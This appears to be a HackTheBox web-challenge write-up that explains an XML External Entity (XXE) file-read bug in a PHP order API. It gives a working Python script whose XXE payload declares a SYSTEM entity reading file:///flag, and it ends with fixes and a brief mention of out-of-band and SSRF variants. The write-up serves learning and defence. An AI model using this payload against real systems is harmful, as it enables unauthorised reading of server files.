---
title: "baby WAFfles order"
date: 2027-03-31 09:00:00 -0500
categories: [HackTheBox, Challenges, Web]
tags: [hackthebox, challenge, web, xxe, php, file-read, cwe-611]
description: "An Easy Web challenge: an order API parses the request body as XML with PHP's external-entity substitution turned on (LIBXML_NOENT), then reflects a parsed field back in the response. Declare a SYSTEM entity pointing at the flag file, reference it in the echoed field, and the server reads the file straight into its reply."
---

## Overview

**baby WAFfles order** is an Easy Web challenge. The "super secure" ordering API
accepts an XML body and parses it with PHP's `simplexml_load_string(..., LIBXML_NOENT)`,
which enables external-entity substitution. Because the parsed `food` field is then
reflected back into the response, this is a textbook in-band [XML External Entity](https://cwe.mitre.org/data/definitions/611.html)
([CWE-611](https://cwe.mitre.org/data/definitions/611.html)) local file read — one request returns the flag.

## The technique

PHP's libxml does **not** resolve external entities by default, so the bug is opt-in:
the code explicitly passes the `LIBXML_NOENT` flag, which tells the parser to *expand*
declared entities — including external `SYSTEM` entities such as `file://`.

The vulnerable handler (`controllers/OrderController.php`) only takes the XML branch
when the request carries `Content-Type: application/xml`:

```php
// Content-Type: application/xml branch
$order = simplexml_load_string($body, 'SimpleXMLElement', LIBXML_NOENT);
if (!$order->food) return 'You need to select a food option first';
return "Your {$order->food} order has been submitted successfully.";
```

The attacker fully controls the raw body, so the attacker controls the DTD. Define an
entity that reads the flag file and reference it inside `<food>`; the parsed value is
echoed verbatim, so the file content comes back inline — no out-of-band channel needed.

## Solution

Set the `Content-Type` to `application/xml` to reach the vulnerable branch, declare a
`SYSTEM` entity pointing at `/flag`, and reference it in the reflected element.

Create `solve.py`:

```python
#!/usr/bin/env python3
import sys, requests

target = sys.argv[1] if len(sys.argv) > 1 else "HOST:PORT"
url = f"http://{target}/api/order"

payload = """<?xml version="1.0"?>
<!DOCTYPE order [<!ENTITY xxe SYSTEM "file:///flag">]>
<root><food>&xxe;</food></root>"""

r = requests.post(url, data=payload, headers={"Content-Type": "application/xml"}, timeout=15)
print(r.text.strip())
```

Run it against the live instance:

```bash
python3 solve.py HOST:PORT
```

The response embeds the flag in the reflected confirmation message:

```
Your HTB{...} order has been submitted successfully.
```

## Why it worked

`LIBXML_NOENT` switched on external-entity substitution, and the application then
trusted and reflected the parsed XML value back to the client. The parser inlined the
contents of `/flag` while expanding `&xxe;`, turning a "submit an order" endpoint into
an arbitrary local file reader.

## Fix / defense

- Don't pass `LIBXML_NOENT`. On PHP < 8 also call `libxml_disable_entity_loader(true)`.
- PHP 8+ disables external-entity loading by default — leave it off.
- Prefer JSON; if XML is required, parse with a hardened, DTD-free configuration.
- Treat parsed XML content as untrusted and never reflect it back unencoded.

```php
// drop LIBXML_NOENT; entities are no longer substituted
$order = simplexml_load_string($body);
```

When no field is reflected, the same primitive escalates to blind/out-of-band
exfiltration (an external DTD plus a `php://filter` base64 read to an attacker host) or
[SSRF](https://cwe.mitre.org/data/definitions/918.html) via an `http://` SYSTEM entity.
